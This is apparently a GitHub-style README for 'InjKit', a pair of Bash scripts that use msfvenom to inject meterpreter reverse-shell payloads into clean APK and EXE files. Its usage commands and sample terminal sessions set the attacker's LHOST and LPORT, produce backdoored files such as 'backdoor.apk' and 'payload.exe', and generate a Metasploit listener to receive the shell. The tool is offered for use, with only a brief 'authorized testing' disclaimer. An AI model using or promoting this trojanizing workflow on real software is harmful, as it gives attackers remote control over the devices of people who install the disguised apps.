# InjKit

**Payload Injector Toolkit (APK & EXE)**

InjKit provides two simple yet powerful Bash scripts that let you inject **meterpreter reverse shell payloads** into clean **APK** or **EXE** files using `msfvenom`.

---

## 📁 Included Scripts

### 1. `apk_injector.sh` — Android APK Injector

Injects a reverse shell payload into a clean APK file using Metasploit’s `msfvenom`.

#### 🔧 Features:

- Simple interactive interface
- Verifies APK file path before injection
- Detects payload settings (LHOST, LPORT)
- Generates a new APK file with embedded payload
- Automatically creates a **Metasploit listener script (`listener.r`)**

#### 🚀 Example Usage:

```bash
chmod +x apk_injector.sh
./apk_injector.sh

🖥️ Sample Terminal Interaction:

===============================
        APK Payload Injector   
===============================

🌐 Enter LHOST: 192.168.1.100
🎯 Enter LPORT: 4444
Enter the path to a clean APK file: /root/app.apk
Enter the output file name (e.g., evil.apk): backdoor.apk

[*] Injecting payload into /root/app.apk...
[+] Payload injected successfully! Saved as: backdoor.apk
[+] Metasploit listener script saved as: listener.r
[*] You can run it using: msfconsole -r listener.r


---

2. exe_injector.sh — Windows EXE Injector

Injects a reverse shell payload into a clean EXE file using Metasploit’s msfvenom.

🔧 Features:

Interactive prompts for LHOST/LPORT and file paths

Detects EXE architecture (x86 or x64) automatically

Selects the appropriate payload

Generates a new EXE with embedded reverse shell

Automatically creates a Metasploit listener script (listener.r)


🚀 Example Usage:

chmod +x exe_injector.sh
./exe_injector.sh

🖥️ Sample Terminal Interaction:

===============================
      EXE Payload Injector     
===============================

🌐 Enter LHOST: 192.168.1.100
🎯 Enter LPORT: 5555
Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe
Enter the output file name (e.g., evil.exe): payload.exe

=========================================
✅ Architecture detected: x64
=========================================

[*] Injecting payload into /root/notepad.exe...
[+] Payload injected successfully! Saved as: payload.exe
[+] Metasploit listener script saved as: listener.r
[*] You can run it using: msfconsole -r listener.r


---

🎯 Listener Script (listener.r)

After each successful payload injection, a file named listener.r is generated. This file contains the required Metasploit commands to handle the reverse connection.

🔁 How to use it:

msfconsole -r listener.r


---

⚠️ Notes

These tools depend on msfvenom, which is part of the Metasploit Framework.

Ensure Metasploit is installed and that msfvenom is accessible via terminal.

This tool is for educational and authorized penetration testing purposes only.



---

💬 Feedback

Feel free to submit issues, improvements, or suggestions.
Made with ❤️ for learning, red teaming, and ethical hacking.


---


